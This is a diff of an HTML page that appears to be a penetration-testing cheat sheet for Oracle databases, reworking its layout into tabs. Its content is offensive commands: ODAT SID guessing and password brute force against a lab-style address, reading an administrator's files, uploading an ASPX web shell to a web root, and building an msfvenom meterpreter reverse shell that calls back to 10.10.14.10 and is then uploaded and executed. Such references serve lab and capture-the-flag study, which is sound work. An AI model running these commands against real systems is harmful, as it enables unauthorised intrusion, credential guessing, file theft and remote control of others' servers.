@@ -202,29 +202,41 @@
 
 <div class="content"><hr>
 <h3 id="tools">Tools</h3>
-<h4 id="sqlplus">sqlplus</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">sqlplus</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >ODAT</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install</span>
 </span></span><span class="line"><span class="cl">sudo apt install oracle-instantclient-sqlplus
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># export LD_LIBRARY_PATH</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/usr/lib/oracle/19.6/client64/lib<span class="si">${</span><span class="nv">LD_LIBRARY_PATH</span><span class="p">:+:</span><span class="nv">$LD_LIBRARY_PATH</span><span class="si">}</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
 </span></span><span class="line"><span class="cl">sqlplus -V
-</span></span></code></pre></div><h4 id="odat-oracle-database-attacking-tool">ODAT (Oracle Database Attacking Tool)</h4>
-<p><a href="https://github.com/quentinhardy/odat">Download ODAT</a></p>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install</span>
 </span></span><span class="line"><span class="cl">sudo apt install odat
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
 </span></span><span class="line"><span class="cl">odat --version
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/quentinhardy/odat">Download ODAT</a></em></small></p></div></p>
+<br>
 <hr>
 <h3 id="enum">Enum</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SID enum (You only need one)</span>
 </span></span><span class="line"><span class="cl">odat sidguesser -s 10.10.11.10
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># User/Password brute force</span>
 </span></span><span class="line"><span class="cl">odat passwordguesser -s 10.10.11.10 -d &lt;SID&gt; --accounts-file accounts.txt
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run all checks with creds as sysdba</span>
 </span></span><span class="line"><span class="cl">odat all -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba
-</span></span></code></pre></div><h3 id="general">General</h3>
+</span></span></code></pre></div></div>
+<h3 id="general">General</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Export everytime or add to ~/.zshrc</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/usr/lib/oracle/19.6/client64/lib<span class="si">${</span><span class="nv">LD_LIBRARY_PATH</span><span class="p">:+:</span><span class="nv">$LD_LIBRARY_PATH</span><span class="si">}</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect</span>
@@ -233,20 +245,27 @@
 </span></span><span class="line"><span class="cl">sqlplus &lt;USER&gt;/&lt;PASSWORD&gt;@10.10.11.10:1521/&lt;SID&gt; as sysdba
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privilege</span>
 </span></span><span class="line"><span class="cl"><span class="k">select</span> * from user_role_privs<span class="p">;</span>
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
 <hr>
-<h4 id="abuse-1-arbitrary-read">Abuse #1: Arbitrary Read</h4>
+<h4 id="arbitrary-read">Arbitrary Read</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">odat ctxsys -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --getFile c:<span class="se">\\</span>users<span class="se">\\</span>administrator<span class="se">\\</span>desktop<span class="se">\\</span>file.txt
-</span></span></code></pre></div><h4 id="upload-file-to-rce">Upload File to RCE</h4>
+</span></span></code></pre></div></div>
+<h4 id="upload-file-to-rce">Upload File to RCE</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">odat dbmsadvisor -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --putFile C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
-</span></span></code></pre></div><h4 id="execute-binary-to-rce">Execute binary to RCE</h4>
+</span></span></code></pre></div></div>
+<h4 id="execute-binary-to-rce">Execute binary to RCE</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious exe</span>
 </span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o revshell.exe
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upload</span>
 </span></span><span class="line"><span class="cl">odat utlfile -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --putFile <span class="se">\\</span>Temp revshell.exe revshell.exe
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Execute</span>
 </span></span><span class="line"><span class="cl">odat externaltable -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --exec <span class="se">\\</span>Temp revshell.exe
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
